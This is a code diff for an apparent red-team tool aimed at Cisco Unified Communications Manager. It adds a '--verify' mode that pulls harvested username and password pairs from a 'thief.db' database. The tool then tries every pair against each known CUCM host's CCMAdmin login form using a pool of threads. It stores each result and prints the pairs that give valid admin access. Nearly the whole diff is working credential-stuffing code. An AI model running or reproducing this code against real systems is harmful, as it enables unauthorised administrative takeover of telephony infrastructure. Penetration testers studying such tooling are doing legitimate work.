@@ -704,6 +704,118 @@ def log_spray_attempt(cucm_host, username, password, status_code, error, db_file
             return
 
 
+def log_verification_attempt(cucm_host, username, password, result, status_code, error, db_file='thief.db'):
+    """
+    Append a row to verification_attempts. Retries with exponential backoff on
+    SQLite 'database is locked' since worker threads write concurrently.
+    Every attempt — valid, invalid, or error — is recorded for auditing.
+    """
+    max_retries = 5
+    retry_delay = 0.1
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    for attempt in range(max_retries):
+        try:
+            conn = sqlite3.connect(db_file, timeout=30.0)
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO verification_attempts
+                    (cucm_host, username, password, result, status_code, error, attempt_time)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (cucm_host, username, password, result, status_code, error, timestamp))
+            conn.commit()
+            conn.close()
+            return
+        except sqlite3.OperationalError as e:
+            if 'locked' in str(e).lower() and attempt < max_retries - 1:
+                time.sleep(retry_delay * (2 ** attempt))
+                continue
+            if globals().get('debug', False):
+                print(f'[!] log_verification_attempt sqlite error: {e}')
+            return
+        except Exception as e:
+            if globals().get('debug', False):
+                print(f'[!] log_verification_attempt error: {e}')
+            return
+
+
+def is_already_verified(cucm_host, username, password, db_file='thief.db'):
+    """
+    Return True iff this exact (cucm_host, username, password) already has a
+    definitive verification_attempts row (result 'valid' or 'invalid').
+    'error' rows do not count — they remain retryable on a later run.
+    Fails closed to False (attempt again) if the table is missing / unreadable.
+    """
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT 1 FROM verification_attempts
+             WHERE cucm_host = ? AND username = ? AND password = ?
+               AND result IN ('valid', 'invalid')
+             LIMIT 1
+        ''', (cucm_host, username, password))
+        row = cursor.fetchone()
+        conn.close()
+        return row is not None
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] is_already_verified error: {e}')
+        return False
+
+
+def get_distinct_credential_pairs(db_file='thief.db'):
+    """
+    Return a list of distinct (username, password) tuples from the credentials
+    table where both fields are non-empty. Order is unspecified.
+    """
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT DISTINCT username, password FROM credentials
+             WHERE username IS NOT NULL AND username != ''
+               AND password IS NOT NULL AND password != ''
+        ''')
+        pairs = [(u, p) for u, p in cursor.fetchall()]
+        conn.close()
+        return pairs
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] get_distinct_credential_pairs error: {e}')
+        return []
+
+
+def get_known_cucm_hosts(db_file='thief.db'):
+    """
+    Return a sorted list of distinct CUCM hosts known to the DB: the union of
+    credentials.cucm_host, phone_cucm.cucm_host, and cluster_servers hostname
+    and ipv4. Empty/NULL values are dropped.
+    """
+    hosts = set()
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        cursor = conn.cursor()
+        for sql in (
+            'SELECT cucm_host FROM credentials',
+            'SELECT cucm_host FROM phone_cucm',
+            'SELECT hostname FROM cluster_servers',
+            'SELECT ipv4 FROM cluster_servers',
+        ):
+            try:
+                for (val,) in cursor.execute(sql).fetchall():
+                    if val:
+                        hosts.add(val)
+            except sqlite3.OperationalError as e:
+                if 'no such table' not in str(e):
+                    raise
+        conn.close()
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] get_known_cucm_hosts error: {e}')
+    return sorted(hosts)
+
+
 def parse_uds_devices(xml_body):
     """Extract SEP device names from a /cucm-uds/user/{id} XML response body."""
     return re.findall(r'<device>(SEP[0-9A-Fa-f]{12})</device>', xml_body)
@@ -1007,6 +1119,130 @@ def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_f
             time.sleep(sleep_secs)
 
 
+def verify_ccmadmin_login(session, cucm_host, port, username, password, timeout=10):
+    """
+    Attempt a CCMAdmin (Tomcat j_security_check) form login on `session`.
+
+    1. GET /ccmadmin/showHome.do to seed the JSESSIONID cookie.
+    2. POST j_username/j_password to /ccmadmin/j_security_check with
+       allow_redirects=False.
+
+    Returns (result, status_code):
+      'valid'   — 302/303 whose Location is NOT a login/error page.
+      'invalid' — 302/303 to a login/error page, or a 200 (logon form re-shown).
+      'error'   — network failure, or any other status (403/404/5xx).
+    """
+    base = f'https://{cucm_host}:{port}/ccmadmin'
+    try:
+        session.get(f'{base}/showHome.do', verify=False, timeout=timeout)
+        resp = session.post(
+            f'{base}/j_security_check',
+            data={'j_username': username, 'j_password': password},
+            verify=False,
+            timeout=timeout,
+            allow_redirects=False,
+        )
+    except Exception as e:
+        dbg(f'verify_ccmadmin_login {username}@{cucm_host} raised {type(e).__name__}: {e}')
+        return ('error', None)
+
+    code = resp.status_code
+    if code in (302, 303):
+        location = (resp.headers.get('Location') or '').lower()
+        if 'login' in location or 'error' in location:
+            return ('invalid', code)
+        return ('valid', code)
+    if code == 200:
+        return ('invalid', code)
+    return ('error', code)
+
+
+def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=None):
+    """
+    Thread target. Pops (cucm_host, username, password) tuples off work_queue,
+    attempts a CCMAdmin login, logs every attempt to verification_attempts, and
+    tallies results['valid'|'invalid'|'error'] under results['lock'].
+
+    _login_fn is injectable for testing (default: verify_ccmadmin_login).
+    """
+    if _login_fn is None:
+        _login_fn = verify_ccmadmin_login
+
+    session = requests.Session()
+    while True:
+        try:
+            cucm_host, username, password = work_queue.get_nowait()
+        except queue.Empty:
+            return
+
+        result, status_code = _login_fn(session, cucm_host, port, username, password, timeout=timeout)
+        error = None if result != 'error' else 'login error'
+        log_verification_attempt(cucm_host, username, password, result, status_code, error, db_file)
+
+        if result == 'valid':
+            print(f'[+] VALID admin: {username}@{cucm_host}')
+
+        with results['lock']:
+            results[result] += 1
+
+
+def run_verify(hosts, pairs, port, threads, db_file):
+    """
+    Top-level orchestrator for --verify.
+
+    Builds the cross-product hosts × pairs into (cucm_host, username, password)
+    tuples, skips combinations already definitively verified, runs a worker pool
+    of CCMAdmin login attempts, and logs every attempt to verification_attempts.
+
+    Returns the results dict (valid/invalid/error/skipped counts) or None under
+    _TEST_MODE.
+    """
+    if _TEST_MODE:
+        return None
+
+    if not hosts:
+        print('[-] No known CUCM hosts in the database. Nothing to verify.')
+        return None
+    if not pairs:
+        print('[-] No credential pairs (username+password) in the database. Nothing to verify.')
+        return None
+
+    work = queue.Queue()
+    skipped = 0
+    queued = 0
+    for host in hosts:
+        for username, password in pairs:
+            if is_already_verified(host, username, password, db_file):
+                skipped += 1
+            else:
+                work.put((host, username, password))
+                queued += 1
+
+    print(f'[+] Verifying {len(pairs)} credential pair(s) against {len(hosts)} host(s): '
+          f'{queued} attempt(s) queued, {skipped} already verified (skipped).')
+
+    results = {'valid': 0, 'invalid': 0, 'error': 0, 'skipped': skipped, 'lock': threading.Lock()}
+    if queued == 0:
+        print('[+] Nothing to do; all combinations already verified.')
+        return results
+
+    worker_threads = []
+    for _ in range(max(1, min(threads, queued))):
+        t = threading.Thread(
+            target=_verify_worker,
+            args=(work, results, port, db_file),
+            daemon=True,
+        )
+        t.start()
+        worker_threads.append(t)
+    for t in worker_threads:
+        t.join()
+
+    print(f'[+] Verification complete: valid={results["valid"]} '
+          f'invalid={results["invalid"]} error={results["error"]} skipped={skipped}')
+    return results
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
@@ -1249,6 +1485,24 @@ def init_database(db_file='thief.db'):
             discovery_time TEXT NOT NULL,
             UNIQUE(cucm_host, username, device_name)
         )
+    ''')
+
+    # Create table for CCMAdmin credential-verification attempts (--verify)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS verification_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
+            result TEXT NOT NULL,
+            status_code INTEGER,
+            error TEXT,
+            attempt_time TEXT NOT NULL
+        )
+    ''')
+    cursor.execute('''
+        CREATE INDEX IF NOT EXISTS idx_verification_attempts_host_user
+            ON verification_attempts(cucm_host, username)
     ''')
 
     conn.commit()
@@ -1624,6 +1878,30 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             else:
                 raise
 
+        # Get verified admin credentials (result == 'valid')
+        verified_admins = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, username, password, attempt_time
+                      FROM verification_attempts
+                     WHERE result = 'valid' AND cucm_host = ?
+                     ORDER BY attempt_time DESC
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, username, password, attempt_time
+                      FROM verification_attempts
+                     WHERE result = 'valid'
+                     ORDER BY attempt_time DESC
+                ''')
+            verified_admins = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                verified_admins = []
+            else:
+                raise
+
         # Get UDS devices (unauthenticated enum or spray hit)
         uds_devices = []
         try:
@@ -1674,7 +1952,7 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
 
         conn.close()
         
-        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices:
+        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices and not verified_admins:
             print(f'\n[-] No data found in database')
             if cucm_filter:
                 print(f'[-] Filter: CUCM host = {cucm_filter}')
@@ -1780,6 +2058,11 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
         if spray_hits:
             print('\n=== UDS Spray Hits ===')
             for host, user, pw, ts in spray_hits:
+                print(f'  [{ts}] {host}  {user} : {pw}')
+
+        if verified_admins:
+            print('\n=== Verified Admin Credentials ===')
+            for host, user, pw, ts in verified_admins:
                 print(f'  [{ts}] {host}  {user} : {pw}')
 
         if uds_devices:
@@ -2047,6 +2330,12 @@ def main():
                         help='Per-username rate-limit window in hours (default: 1)')
     parser.add_argument('--no-spray-probe', action='store_true', default=False,
                         help='Skip the pre-flight oracle probe (use only after manual verification)')
+    parser.add_argument('--verify', action='store_true', default=False,
+                        help='Verify stored credential pairs against each known CUCM CCMAdmin portal (requires the database)')
+    parser.add_argument('--verify-port', type=int, default=8443,
+                        help='CCMAdmin HTTPS port for --verify (default: 8443; some clusters use 443)')
+    parser.add_argument('--verify-threads', type=int, default=10,
+                        help='Concurrent verification workers (default: 10)')
 
     # Output Options
     parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
@@ -2197,6 +2486,30 @@ def main():
     dbg(f'parsed args: host={CUCM_host} phones={phones} brute_mac={brute_mac} '
         f'enumsubnet={enumsubnet} userenum={args.userenum} servers={args.servers} use_tftp={use_tftp} '
         f'threads={threads} db={db_file} no_db={no_db} force={force_download}')
+
+    if args.verify:
+        if args.no_db:
+            print('--verify requires the database; it cannot be used with --no-db')
+            quit(1)
+        if args.brute_mac:
+            print('--verify and --brute-mac are mutually exclusive')
+            quit(1)
+        if args.spray:
+            print('--verify and --spray are mutually exclusive')
+            quit(1)
+        pairs = get_distinct_credential_pairs(db_file)
+        if CUCM_host:
+            hosts = [CUCM_host]
+        else:
+            hosts = get_known_cucm_hosts(db_file)
+        run_verify(
+            hosts=hosts,
+            pairs=pairs,
+            port=args.verify_port,
+            threads=args.verify_threads,
+            db_file=db_file,
+        )
+        quit(0)
 
     if CUCM_host:
         version_info = get_version(CUCM_host, port=args.uds_port)
